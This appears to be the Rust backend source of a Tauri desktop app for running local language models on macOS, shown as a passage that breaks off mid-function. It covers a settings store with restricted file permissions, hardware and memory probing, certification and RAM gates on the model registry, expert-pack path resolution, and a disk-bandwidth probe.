// Galactus desktop, Rust side.
//
// Everything the frontend cannot or must not do lives here: hardware
// inspection, the model registry, the llama-server lifecycle, the
// download/profile/plan/pack install pipeline, the file/shell tools that sit
// behind the permission gate, the settings store and the MCP stdio clients.

mod code;
mod cron;
mod hardware;
mod knowledge;
mod lsp;
mod pty;
mod relay;
mod pylang;
mod scheduler;
mod search;
mod snapshot;
mod symbols;
mod toolchain;
pub mod cli;

use serde::Serialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write as IoWrite};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant};
use tauri::{AppHandle, Emitter, Manager};

const SERVER_PORT_BASE: u16 = 8737;
const SERVER_PORT_SPAN: u16 = 40;

// ---------------------------------------------------------------- settings

fn settings_path() -> PathBuf {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    PathBuf::from(home).join("Library/Application Support/Galactus/settings.json")
}

#[cfg(unix)]
fn set_private_mode(path: &Path, mode: u32) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    let mut permissions = std::fs::metadata(path).map_err(|e| e.to_string())?.permissions();
    permissions.set_mode(mode);
    std::fs::set_permissions(path, permissions).map_err(|e| e.to_string())
}

#[cfg(not(unix))]
fn set_private_mode(_path: &Path, _mode: u32) -> Result<(), String> {
    Ok(())
}

/// settings.json contains connector credentials and standing permissions.
/// Protect the existing installation too, not only files created by this build.
fn harden_settings_permissions() -> Result<(), String> {
    let file = settings_path();
    if let Some(dir) = file.parent() {
        if dir.exists() {
            set_private_mode(dir, 0o700)?;
        }
    }
    if file.exists() {
        set_private_mode(&file, 0o600)?;
    }
    Ok(())
}

fn settings_load() -> HashMap<String, String> {
    std::fs::read_to_string(settings_path())
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn settings_store(map: &HashMap<String, String>) -> Result<(), String> {
    let p = settings_path();
    if let Some(dir) = p.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
        set_private_mode(dir, 0o700)?;
    }
    // Write-then-rename (atomic on APFS): a plain overwrite has a truncate
    // window during which a concurrent settings_load reads an empty map, and
    // the next store would then wipe every key.
    let tmp = p.with_extension(format!("tmp.{}", std::process::id()));
    let payload = serde_json::to_string_pretty(map).map_err(|e| e.to_string())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .mode(0o600)
            .open(&tmp)
            .map_err(|e| e.to_string())?;
        set_private_mode(&tmp, 0o600)?;
        file.write_all(payload.as_bytes()).map_err(|e| e.to_string())?;
        file.sync_all().map_err(|e| e.to_string())?;
    }
    #[cfg(not(unix))]
    std::fs::write(&tmp, payload).map_err(|e| e.to_string())?;
    std::fs::rename(&tmp, &p).map_err(|e| e.to_string())?;
    set_private_mode(&p, 0o600)
}

/// Serialized load-modify-store on the settings map. Several threads update
/// settings.json (install pipeline thread, main-thread commands, tokio
/// commands): without one lock two concurrent updates drop each other's keys.
pub(crate) fn settings_update<T>(f: impl FnOnce(&mut HashMap<String, String>) -> T) -> Result<T, String> {
    static SETTINGS_LOCK: Mutex<()> = Mutex::new(());
    let _guard = SETTINGS_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let mut map = settings_load();
    let out = f(&mut map);
    settings_store(&map)?;
    Ok(out)
}

#[tauri::command]
fn settings_get() -> HashMap<String, String> {
    settings_load()
}

#[tauri::command]
fn settings_set(key: String, value: String) -> Result<(), String> {
    settings_update(|map| {
        map.insert(key, value);
    })
}

#[cfg(all(test, unix))]
mod settings_permission_tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;
    use std::time::{SystemTime, UNIX_EPOCH};

    #[test]
    fn private_modes_remove_group_and_world_access() {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let dir = std::env::temp_dir().join(format!(
            "galactus-settings-mode-{}-{unique}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("settings.json");
        std::fs::write(&file, "{}").unwrap();

        set_private_mode(&dir, 0o700).unwrap();
        set_private_mode(&file, 0o600).unwrap();

        assert_eq!(std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777, 0o700);
        assert_eq!(std::fs::metadata(&file).unwrap().permissions().mode() & 0o777, 0o600);
        let _ = std::fs::remove_dir_all(dir);
    }
}

fn galactus_root() -> Result<PathBuf, String> {
    let map = settings_load();
    if let Some(root) = map.get("root").cloned().filter(|s| !s.is_empty()) {
        let p = PathBuf::from(root);
        if p.join("scripts/models-registry.json").exists() {
            return Ok(p);
        }
    }
    // No (valid) checkout configured: run self-contained on the bundled data.
    provision_default_root()
}

/// Bundle Resources dir (packaged app) or src-tauri (dev run).
fn resource_dir() -> Option<PathBuf> {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(res) = exe
            .parent()
            .and_then(|p| p.parent())
            .map(|p| p.join("Resources"))
        {
            if res.join("engine/llama-server").exists() || res.join("packaged").exists() {
                return Some(res);
            }
        }
    }
    let dev = std::env::current_dir().unwrap_or_default().join("src-tauri");
    if dev.join("engine").exists() || dev.join("packaged").exists() {
        return Some(dev);
    }
    None
}

/// The llama-server shipped inside the app bundle (fully relocated: dylibs
/// and OpenSSL travel with it). Returns None when the app was built without
/// an engine (dev builds before prepare-engine.sh).
fn bundled_engine() -> Option<PathBuf> {
    let bin = resource_dir()?.join("engine/llama-server");
    if !bin.is_file() {
        return None;
    }
    // Resource copying does not guarantee the executable bit.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&bin) {
            let mut perm = meta.permissions();
            if perm.mode() & 0o111 == 0 {
                perm.set_mode(0o755);
                let _ = std::fs::set_permissions(&bin, perm);
            }
        }
    }
    Some(bin)
}

/// The isolated Python runtime shipped in the bundle. A virgin macOS has no
/// /usr/bin/python3 (it is a Command Line Tools shim that pops an install
/// dialog): the app must never depend on it.
/// rust-analyzer embarque, et les sources de la bibliotheque standard qui vont
/// avec. Retourne le binaire et la racine des sources, ou None si l'outillage
/// n'a pas ete embarque a la construction.
///
/// Le serveur seul resout la navigation a l'interieur du projet mais pas
/// `std::` : sans sysroot il signale des erreurs partout. Les sources
/// suffisent, le toolchain complet (1,2 Go) n'a pas a etre livre. Si l'utilisateur
/// a rustup, rust-analyzer utilisera en plus `cargo metadata` pour resoudre
/// les dependances de son projet, ce que les sources seules ne donnent pas.
pub(crate) fn bundled_rust_analyzer() -> Option<(PathBuf, PathBuf)> {
    let root = resource_dir()?.join("rust-tooling");
    let bin = root.join("rust-analyzer");
    let src = root.join("rust-src/library");
    if bin.is_file() && src.is_dir() {
        Some((bin, src))
    } else {
        None
    }
}

/// Chemin du serveur et de son sysroot, pour la vue Code. Expose au frontend
/// afin que le badge de niveau dise la verite : Rust passe au niveau complet
/// seulement si les deux sont reellement presents.
#[tauri::command]
fn rust_analyzer_paths() -> Option<(String, String)> {
    bundled_rust_analyzer()
        .map(|(b, s)| (b.display().to_string(), s.display().to_string()))
}

fn bundled_python() -> Option<PathBuf> {
    let bin = resource_dir()?.join("python/bin/python3");
    if bin.is_file() {
        Some(bin)
    } else {
        None
    }
}

/// A ready-to-use python3 invocation: bundled interpreter in isolated mode
/// (-I: ignores PYTHON* env vars and user site-packages, a local sandbox),
/// falling back to the system python3 for developer checkouts.
fn python3_cmd() -> Command {
    match bundled_python() {
        Some(bin) => {
            let mut c = Command::new(bin);
            c.arg("-I");
            c
        }
        None => Command::new("python3"),
    }
}

/// Self-contained mode: data lives in Application Support/Galactus/data,
/// seeded from the registry and scripts bundled with the app. No checkout,
/// no third-party install: plug and play.
fn provision_default_root() -> Result<PathBuf, String> {
    let root = app_support().join("data");
    let scripts = root.join("scripts");
    std::fs::create_dir_all(&scripts).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join("models")).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join("artifacts/h4/packs")).map_err(|e| e.to_string())?;
    let res = resource_dir()
        .ok_or("Galactus folder is not set and the app bundle carries no packaged data")?;
    let src = res.join("packaged/scripts");
    // These files are application policy and implementation, not user data.
    // Refresh them on every launch so an upgraded app cannot keep executing an
    // obsolete hardware floor or installer from its first installation.
    for f in [
        "models-registry.json",
        "moe-profile.py",
        "galactus-pack-plan.py",
        "galactus-pack-write.py",
    ] {
        let destination = scripts.join(f);
        let temporary = scripts.join(format!(".{f}.new"));
        std::fs::copy(src.join(f), &temporary).map_err(|e| format!("refresh {f}: {e}"))?;
        std::fs::rename(&temporary, &destination).map_err(|e| format!("activate {f}: {e}"))?;
    }
    Ok(root)
}

// ---------------------------------------------------------------- hardware

#[derive(Serialize, Clone)]
struct HwInfo {
    chip: String,
    cores: u32,
    ram_gb: u64,
    disk_free_gb: u64,
    /// GPU cores, from ioreg. `None` on Intel or in a VM.
    gpu_cores: Option<u32>,
    /// The CPU tiers, fastest first, named as macOS names them. Never a name
    /// this code invented: see `hardware::read_core_levels`.
    core_levels: Vec<hardware::CoreLevel>,
    /// `MTLDevice.recommendedMaxWorkingSetSize`: the unified memory this GPU
    /// may keep resident. `None` when there is no Metal device.
    gpu_working_set_bytes: Option<u64>,
    /// Apple's published memory bandwidth for this chip, GB/s. `None` for any
    /// chip released after this build. Shown, never used to decide.
    bandwidth_gbs: Option<f64>,
    /// What the engine may hold in total RIGHT NOW: the tightest of the four
    /// bounds. This is the number a user needs to understand any refusal, and
    /// it is the one the app never showed.
    engine_budget_bytes: u64,
    /// Live, and the reason `hw_info` is worth calling more than once.
    power_source: hardware::PowerSource,
    power_mode: hardware::PowerMode,
}

fn run_capture(cmd: &str, args: &[&str]) -> String {
    Command::new(cmd)
        .args(args)
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default()
}

// Async so the probe (df on a possibly sleeping external volume) runs off the
// main thread; the sync impl stays for internal and CLI callers.
#[tauri::command]
async fn hw_info() -> HwInfo {
    hw_info_impl()
}

/// Memory this Mac can actually hand over right now, not the memory it was sold
/// with.
///
/// The planner budgeted against `hw.memsize` and subtracted a fixed reserve for
/// "macOS and whatever the user is doing". That reserve is a guess about
/// somebody else's machine: it was right on the machine this was written on and
/// wrong on a colleague's 24 GB Mac with a browser open, where the engine came
/// back with "Compute error." and nothing pointing at memory.
///
/// Free plus inactive plus speculative, because macOS counts as inactive the
/// pages it will hand over without hesitating, and counting only `free` would
/// make a healthy Mac look full. Purgeable is deliberately NOT counted: it is
/// reclaimable, but reclaiming it costs the app that owns it.
///
/// Returns None when vm_stat cannot be read or parsed, and the caller then
/// falls back to the installed-RAM budget: a missing measurement must not make
/// the planner refuse everything.
fn available_memory_bytes() -> Option<u64> {
    let out = run_capture("vm_stat", &[]);
    if out.is_empty() {
        return None;
    }
    let mut page = 0u64;
    if let Some(i) = out.find("page size of ") {
        page = out[i + 13..]
            .split_whitespace()
            .next()
            .and_then(|s| s.parse().ok())
            .unwrap_or(0);
    }
    if page == 0 {
        return None;
    }
    let mut pages = 0u64;
    let mut seen = 0;
    for line in out.lines() {
        let want = line.starts_with("Pages free:")
            || line.starts_with("Pages inactive:")
            || line.starts_with("Pages speculative:");
        if !want {
            continue;
        }
        if let Some(v) = line.rsplit(':').next() {
            if let Ok(n) = v.trim().trim_end_matches('.').parse::<u64>() {
                pages += n;
                seen += 1;
            }
        }
    }
    if seen == 0 {
        return None;
    }
    Some(pages.saturating_mul(page))
}

#[cfg(test)]
mod available_memory_tests {
    use super::available_memory_bytes;

    #[test]
    fn it_reads_a_plausible_figure_from_this_machine() {
        // Not a fixed value: the point is that it parses vm_stat and lands in a
        // range no parsing bug would land in. A misread page size or a dropped
        // decimal point leaves this by orders of magnitude.
        let got = available_memory_bytes().expect("vm_stat is readable on macOS");
        assert!(got > 100_000_000, "suspiciously small: {got}");
        assert!(got < 2_000_000_000_000, "suspiciously large: {got}");
    }
}

fn hw_info_impl() -> HwInfo {
    // The static half is read once per process and cached: the chip, the
    // cores, the soldered memory and the Metal limits do not move while the
    // app runs. About 30 ms the first time, nothing after.
    let profile = hardware::static_profile();
    let base = galactus_root()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "/".into());
    let df = run_capture("df", &["-g", &base]);
    let disk_free_gb: u64 = df
        .lines()
        .nth(1)
        .and_then(|l| l.split_whitespace().nth(3))
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    // hw.memsize is a power of two: a "128 GB" Mac is 128 GiB. Dividing by
    // 1e9 would report 137 and defeat every min_ram_gb gate.
    let ram_gb = profile.ram_bytes >> 30;
    let live = hardware::live_state(available_memory_bytes());
    let machine = MachineLimits {
        ram_gb,
        available: live.available_bytes,
        gpu_working_set: profile.gpu.map(|g| g.working_set_bytes),
    };
    HwInfo {
        chip: profile.chip.clone(),
        cores: profile.cores,
        ram_gb,
        disk_free_gb,
        gpu_cores: profile.gpu_cores,
        core_levels: profile.core_levels.clone(),
        gpu_working_set_bytes: profile.gpu.map(|g| g.working_set_bytes),
        bandwidth_gbs: profile.bandwidth_gbs,
        engine_budget_bytes: engine_budget_bytes(ram_gb * 1_000_000_000, machine),
        power_source: live.power_source,
        power_mode: live.power_mode,
    }
}

// ---------------------------------------------------------------- registry

fn find_gguf(dir: &Path) -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = std::fs::read_dir(dir)
        .ok()?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().map(|e| e == "gguf").unwrap_or(false))
        .collect();
    candidates.sort();
    // Multi-shard models: the 00001 shard is the one llama.cpp opens.
    candidates.into_iter().next()
}

fn model_paths(root: &Path, id: &str) -> (PathBuf, PathBuf, PathBuf) {
    let model_dir = root.join("models").join(id);
    let pack = root
        .join("artifacts/h4/packs")
        .join(id)
        .join(format!("{id}.pack"));
    let profile = model_dir.join("profile.engine.txt");
    (model_dir, pack, profile)
}

// Async: resolve_packs can glob over external volumes, which stalls when a
// disk has to spin up. The main thread must never wait on that.
#[tauri::command]
async fn load_registry() -> Result<Vec<Value>, String> {
    let root = galactus_root()?;
    let raw = std::fs::read_to_string(root.join("scripts/models-registry.json"))
        .map_err(|e| e.to_string())?;
    let parsed: Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    let models = parsed["models"].as_array().cloned().unwrap_or_default();
    let mut out = Vec::new();
    for mut m in models {
        let id = m["id"].as_str().unwrap_or("").to_string();
        let (model_dir, _pack, _profile) = model_paths(&root, &id);
        let gguf_present = find_gguf(&model_dir).is_some();
        // Dual-pack aware: a model whose packs resolve through the registry
        // fields or the install settings (GLM double-pack) counts as installed.
        let (pack_i, pack_e) = resolve_packs(&root, &id, &m)?;
        let pack_present = pack_i.is_file() && pack_e.is_file();
        m["pack_internal"] = json!(pack_i.display().to_string());
        m["pack_external"] = json!(pack_e.display().to_string());
        m["gguf_present"] = json!(gguf_present);
        m["pack_present"] = json!(pack_present);
        m["installed"] = json!(gguf_present && pack_present);
        out.push(m);
    }
    Ok(out)
}

fn registry_entry(root: &Path, id: &str) -> Result<Value, String> {
    let raw = std::fs::read_to_string(root.join("scripts/models-registry.json"))
        .map_err(|e| e.to_string())?;
    let parsed: Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    parsed["models"]
        .as_array()
        .and_then(|a| a.iter().find(|m| m["id"] == id).cloned())
        .ok_or_else(|| format!("unknown model {id}"))
}

/// The registry is the execution policy, not a catalogue label.  A model may
/// be listed while its Galactus path is still being validated, but it must not
/// be downloaded or served until one of the accepted certification regimes is
/// recorded.  Keep this gate in the backend so the CLI and a modified webview
/// cannot bypass it.
fn require_certified_model(entry: &Value) -> Result<(), String> {
    let id = entry["id"].as_str().unwrap_or("unknown");
    match entry["status"].as_str() {
        Some("certified" | "certified_bit_transparent" | "certified_by_composition") => Ok(()),
        Some("pending_certification") => Err(format!(
            "model {id} is awaiting Galactus certification and cannot be installed or started"
        )),
        Some(status) => Err(format!(
            "model {id} has unsupported certification status '{status}'"
        )),
        None => Err(format!("model {id} has no certification status")),
    }
}

/// Unified memory is the limiting hardware dimension exposed by the registry.
/// This backend gate mirrors the catalogue filtering and protects direct IPC
/// and CLI calls from downloading hundreds of gigabytes for an unusable model.
fn require_compatible_hardware(entry: &Value, ram_gb: u64) -> Result<(), String> {
    let id = entry["id"].as_str().unwrap_or("unknown");
    let minimum = entry["min_ram_gb"].as_u64().ok_or_else(|| {
        format!("model {id} has no minimum unified-memory requirement in the registry")
    })?;
    if ram_gb < minimum {
        return Err(format!(
            "model {id} requires at least {minimum} GB of unified memory; this Mac has {ram_gb} GB"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod registry_policy_tests {
    use super::*;

    #[test]
    fn execution_accepts_only_the_three_certified_regimes() {
        for status in [
            "certified",
            "certified_bit_transparent",
            "certified_by_composition",
        ] {
            assert!(require_certified_model(&json!({"id": "m", "status": status})).is_ok());
        }
    }

    #[test]
    fn pending_unknown_and_missing_statuses_are_rejected() {
        for entry in [
            json!({"id": "pending", "status": "pending_certification"}),
            json!({"id": "draft", "status": "draft"}),
            json!({"id": "missing"}),
        ] {
            assert!(require_certified_model(&entry).is_err());
        }
    }

    #[test]
    fn hardware_gate_uses_the_registry_minimum_and_fails_closed() {
        let model = json!({"id": "large", "min_ram_gb": 128});
        assert!(require_compatible_hardware(&model, 16).is_err());
        assert!(require_compatible_hardware(&model, 127).is_err());
        assert!(require_compatible_hardware(&model, 128).is_ok());
        assert!(require_compatible_hardware(&json!({"id": "unspecified"}), 128).is_err());
    }
}

// ---------------------------------------------------------------- pack resolution

/// Expand a leading `~` or `$HOME` in a user-supplied path.
fn expand_home(s: &str) -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    if let Some(rest) = s.strip_prefix("$HOME") {
        format!("{home}{rest}")
    } else if let Some(rest) = s.strip_prefix('~') {
        format!("{home}{rest}")
    } else {
        s.to_string()
    }
}

/// Wildcard match for ONE path component: `*` (any run) and `?` (one char).
fn component_matches(pat: &str, name: &str) -> bool {
    let p: Vec<char> = pat.chars().collect();
    let n: Vec<char> = name.chars().collect();
    let mut dp = vec![vec![false; n.len() + 1]; p.len() + 1];
    dp[0][0] = true;
    for i in 1..=p.len() {
        if p[i - 1] == '*' {
            dp[i][0] = dp[i - 1][0];
        }
        for j in 1..=n.len() {
            dp[i][j] = match p[i - 1] {
                '*' => dp[i - 1][j] || dp[i][j - 1],
                '?' => dp[i - 1][j - 1],
                c => dp[i - 1][j - 1] && c == n[j - 1],
            };
        }
    }
    dp[p.len()][n.len()]
}

/// First (lexicographic) file matching a simple glob pattern: `*`/`?` inside a
/// component, `**` for any directory depth, the same idioms galactus.env uses.
/// The walk is bounded so a pack lookup stays instant even on a huge volume.
fn glob_first(pattern: &str) -> Option<PathBuf> {
    use std::path::Component;
    let mut base = PathBuf::new();
    let mut parts: Vec<String> = Vec::new();
    let mut in_glob = false;
    for comp in Path::new(pattern).components() {
        match comp {
            Component::RootDir => base.push("/"),
            Component::Normal(c) => {
                let c = c.to_string_lossy().into_owned();
                if !in_glob && !c.contains('*') && !c.contains('?') {
                    base.push(&c);
                } else {
                    in_glob = true;
                    parts.push(c);
                }
            }
            Component::CurDir => {}
            _ => return None,
        }
    }
    if parts.is_empty() {
        return base.is_file().then_some(base);
    }
    fn walk(dir: &Path, parts: &[String], depth: u32, budget: &mut u32, out: &mut Vec<PathBuf>) {
        if *budget == 0 || depth == 0 {
            return;
        }
        let Some((head, rest)) = parts.split_first() else { return };
        let Ok(rd) = std::fs::read_dir(dir) else { return };
        let mut entries: Vec<_> = rd.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        if head == "**" {
            // `**` also matches zero directories: try the rest right here.
            walk(dir, rest, depth, budget, out);
            for e in &entries {
                if *budget == 0 {
                    return;
                }
                *budget -= 1;
                let p = e.path();
                if p.is_dir() {
                    walk(&p, parts, depth - 1, budget, out);
                }
            }
        } else {
            for e in &entries {
                if *budget == 0 {
                    return;
                }
                *budget -= 1;
                let name = e.file_name().to_string_lossy().into_owned();
                if !component_matches(head, &name) {
                    continue;
                }
                let p = e.path();
                if rest.is_empty() {
                    if p.is_file() {
                        out.push(p);
                    }
                } else if p.is_dir() {
                    walk(&p, rest, depth - 1, budget, out);
                }
            }
        }
    }
    let mut out = Vec::new();
    let mut budget: u32 = 20_000;
    walk(&base, &parts, 8, &mut budget, &mut out);
    out.sort();
    out.into_iter().next()
}

/// Resolve one pack path spec: `~`/`$HOME` expansion, paths relative to the
/// Galactus root, simple glob patterns. Yields the file only if it exists.
fn resolve_pack_spec(root: &Path, spec: &str) -> Option<PathBuf> {
    let expanded = expand_home(spec.trim());
    if expanded.is_empty() {
        return None;
    }
    let full = if Path::new(&expanded).is_absolute() {
        PathBuf::from(&expanded)
    } else {
        root.join(&expanded)
    };
    let s = full.to_string_lossy().into_owned();
    if s.contains('*') || s.contains('?') {
        glob_first(&s)
    } else {
        full.is_file().then_some(full)
    }
}

/// The (internal, external) pack pair of a model, in priority order:
///   (a) `internal_pack` / `external_pack` fields of the registry entry,
///   (b) settings `pack_internal_<id>` / `pack_external_<id>` (dual install),
///   (c) the classic mono pack artifacts/h4/packs/<id>/<id>.pack for BOTH.
/// A tier is selected only when EVERY spec it declares resolves to an existing
/// file: half of a dual pack is useless (the records are cut across the two
/// files), and a registry carrying another machine's paths must fall through.
/// Identical internal and external paths mean mono-volume to the engine.
fn resolve_packs(root: &Path, id: &str, entry: &Value) -> Result<(PathBuf, PathBuf), String> {
    let tier = |i_spec: Option<&str>, e_spec: Option<&str>| -> Option<(PathBuf, PathBuf)> {
        let i = match i_spec {
            Some(s) => Some(resolve_pack_spec(root, s)?),
            None => None,
        };
        let e = match e_spec {
            Some(s) => Some(resolve_pack_spec(root, s)?),
            None => None,
        };
        match (i, e) {
            (Some(i), Some(e)) => Some((i, e)),
            (Some(i), None) => Some((i.clone(), i)),
            (None, Some(e)) => Some((e.clone(), e)),
            (None, None) => None,
        }
    };
    if let Some(p) = tier(entry["internal_pack"].as_str(), entry["external_pack"].as_str()) {
        return Ok(p);
    }
    let settings = settings_load();
    let non_empty = |k: String| -> Option<String> {
        settings.get(&k).map(|v| v.trim().to_string()).filter(|v| !v.is_empty())
    };
    let set_i = non_empty(format!("pack_internal_{id}"));
    let set_e = non_empty(format!("pack_external_{id}"));
    if let Some(p) = tier(set_i.as_deref(), set_e.as_deref()) {
        return Ok(p);
    }
    let (_, pack, _) = model_paths(root, id);
    Ok((pack.clone(), pack))
}

// ---------------------------------------------------------------- volumes + bandwidth

#[derive(Serialize, Clone)]
struct VolumeInfo {
    name: String,
    mount: String,
    /// Suggested pack directory on this volume (GalactusH4 convention).
    dir: String,
    /// Where the bandwidth probe should look for a big file.
    probe: String,
    free_gb: u64,
    total_gb: u64,
}

/// `df -g` for a path: (device, total_gb, free_gb, mount point).
fn df_line(path: &str) -> Option<(String, u64, u64, String)> {
    let out = run_capture("df", &["-g", path]);
    let l = out.lines().nth(1)?;
    let cols: Vec<&str> = l.split_whitespace().collect();
    if cols.len() < 9 {
        return None;
    }
    let device = cols[0].to_string();
    let total = cols[1].parse().ok()?;
    let free = cols[3].parse().ok()?;
    // The mount point may contain spaces: everything from column 8 on.
    let mount = cols[8..].join(" ");
    Some((device, total, free, mount))
}

const INSTALL_DOWNLOAD_RESERVE_GIB: u64 = 2;

fn required_download_gib(total_bytes: u64, already_downloaded: u64) -> u64 {
    const GIB: u64 = 1024 * 1024 * 1024;
    total_bytes
        .saturating_sub(already_downloaded)
        .div_ceil(GIB)
        .saturating_add(INSTALL_DOWNLOAD_RESERVE_GIB)
}

/// Refuse before curl starts. The GGUF is always downloaded under the
/// Galactus root even when the expert pack is sent to another SSD.
fn require_download_space(root: &Path, id: &str, files: &[String], total_bytes: u64) -> Result<(), String> {
    let model_dir = root.join("models").join(id);
    let already_downloaded = files
        .iter()
        .map(|name| std::fs::metadata(model_dir.join(name)).map(|m| m.len()).unwrap_or(0))
        .sum();
    let required = required_download_gib(total_bytes, already_downloaded);
    let probe = root.to_string_lossy();
    let (_, _, free, mount) = df_line(&probe)
        .ok_or_else(|| format!("cannot measure free space for {}", root.display()))?;
    if free < required {
        return Err(format!(
            "not enough space for the model download on {mount}: {required} GiB required, {free} GiB free"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod install_space_tests {
    use super::*;

    #[test]
    fn download_preflight_counts_only_remaining_bytes_and_keeps_a_reserve() {
        const GIB: u64 = 1024 * 1024 * 1024;
        assert_eq!(required_download_gib(202 * GIB, 0), 204);
        assert_eq!(required_download_gib(202 * GIB, 200 * GIB), 4);
        assert_eq!(required_download_gib(202 * GIB, 202 * GIB), 2);
        assert_eq!(required_download_gib(GIB + 1, 0), 4);
    }
}

/// Mounted volumes that can host a pack: the system data volume (via $HOME),
/// everything under /Volumes, and the volume carrying the Galactus root.
/// Deduplicated by device so /, /System/Volumes/Data and the /Volumes symlink
/// to the boot disk collapse into one entry.
#[tauri::command]
fn list_volumes() -> Vec<VolumeInfo> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let mut candidates: Vec<(String, String)> = vec![("Macintosh HD".into(), home.clone())];
    if let Ok(rd) = std::fs::read_dir("/Volumes") {
        let mut vols: Vec<_> = rd.flatten().collect();
        vols.sort_by_key(|e| e.file_name());
        for e in vols {
            let name = e.file_name().to_string_lossy().into_owned();
            if name.starts_with('.') {
                continue;
            }
            // The boot-disk symlink in /Volumes duplicates the home entry.
            if e.path().read_link().is_ok() {
                continue;
            }
            candidates.push((name, e.path().display().to_string()));
        }
    }
    if let Ok(root) = galactus_root() {
        candidates.push((String::new(), root.display().to_string()));
    }
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    for (name, path) in candidates {
        let Some((device, total, free, mount)) = df_line(&path) else { continue };
        if !device.starts_with("/dev/") || !seen.insert(device) {
            continue;
        }
        let on_data = mount == "/" || mount == "/System/Volumes/Data";
        let name = if !name.is_empty() {
            name
        } else if on_data {
            "Macintosh HD".into()
        } else {
            Path::new(&mount)
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| mount.clone())
        };
        let (dir, probe) = if on_data {
            (format!("{home}/GalactusH4"), home.clone())
        } else {
            (format!("{mount}/GalactusH4"), mount.clone())
        };
        // Only writable volumes can host a pack (Time Machine, DMGs and
        // network mounts often are not): probed with a real create+delete.
        let test_base = if on_data { Path::new(&home) } else { Path::new(&mount) };
        let test = test_base.join(format!(".galactus-wtest-{}", std::process::id()));
        let writable = std::fs::File::create(&test).is_ok();
        let _ = std::fs::remove_file(&test);
        if !writable {
            continue;
        }
        out.push(VolumeInfo { name, mount, dir, probe, free_gb: free, total_gb: total });
    }
    out
}

const BW_CHUNK: usize = 8 * 1024 * 1024;
const BW_MIN_FILE: u64 = 2_000_000_000;
/// Queued probe shape. A per-expert record is a few MiB (4.1 MB on olmoe,
/// 13.2 MB on GLM-5.2) and the engine keeps many of them in flight per volume
/// (GALACTUS_H4_QD, 32 at serve time). 4 MiB at 16 deep sits in that regime,
/// which is what the ratio has to be measured in.
const BW_RECORD_CHUNK: usize = 4 * 1024 * 1024;
const BW_INFLIGHT: usize = 16;
/// Bytes the queued probe reads in total. Big enough that a few hundred
/// milliseconds of scheduling noise does not move the answer, small enough
/// that two volumes are probed in a couple of seconds.
const BW_QUEUED_TARGET: u64 = 1_500_000_000;
/// Record alignment, so probe offsets land where real reads land.
const RECORD_ALIGN: u64 = 16_384;

/// F_NOCACHE on macOS: reads bypass the unified buffer cache, so the probe
/// measures the SSD instead of RAM (same flag the H4 reader uses).
#[cfg(target_os = "macos")]
fn set_nocache(file: &std::fs::File) {
    use std::os::unix::io::AsRawFd;
    extern "C" {
        fn fcntl(fd: i32, cmd: i32, ...) -> i32;
    }
    const F_NOCACHE: i32 = 48;
    unsafe {
        fcntl(file.as_raw_fd(), F_NOCACHE, 1);
    }
}

/// Biggest file above `min_bytes` under `dir` (bounded walk, symlinks not
/// followed). Stops early once a comfortably large file is found.
fn find_big_file(dir: &Path, min_bytes: u64) -> Option<PathBuf> {
    let mut best: Option<(u64, PathBuf)> = None;
    let mut stack = vec![(dir.to_path_buf(), 0u32)];
    let mut budget: u32 = 40_000;
    while let Some((d, depth)) = stack.pop() {
        if budget == 0 {
            break;
        }
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            if budget == 0 {
                break;
            }
            budget -= 1;
            if e.file_name().to_string_lossy().starts_with('.') {
                continue;
            }
            let Ok(meta) = e.metadata() else { continue };
            if meta.is_dir() {
                if depth < 5 {
                    stack.push((e.path(), depth + 1));
                }
            } else if meta.is_file() && meta.len() >= min_bytes {
                if best.as_ref().map(|(s, _)| meta.len() > *s).unwrap_or(true) {
                    best = Some((meta.len(), e.path()));
                }
                if best.as_ref().map(|(s, _)| *s >= 4 * min_bytes).unwrap_or(false) {
                    return best.map(|(_, p)| p);
                }
            }
        }
    }
    best.map(|(_, p)| p)
}

/// Write an incompressible ~2 GB probe file (xorshift-filled blocks: zeros
/// could be shortcut by the storage stack) for volumes holding nothing big.
fn write_probe_file(path: &Path, size: u64) -> Result<(), String> {
    use std::io::Write;
    let mut f = std::fs::File::create(path).map_err(|e| e.to_string())?;
    let mut block = vec![0u8; BW_CHUNK];
    let mut x: u64 = 0x9e37_79b9_7f4a_7c15;
    for b in block.chunks_exact_mut(8) {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
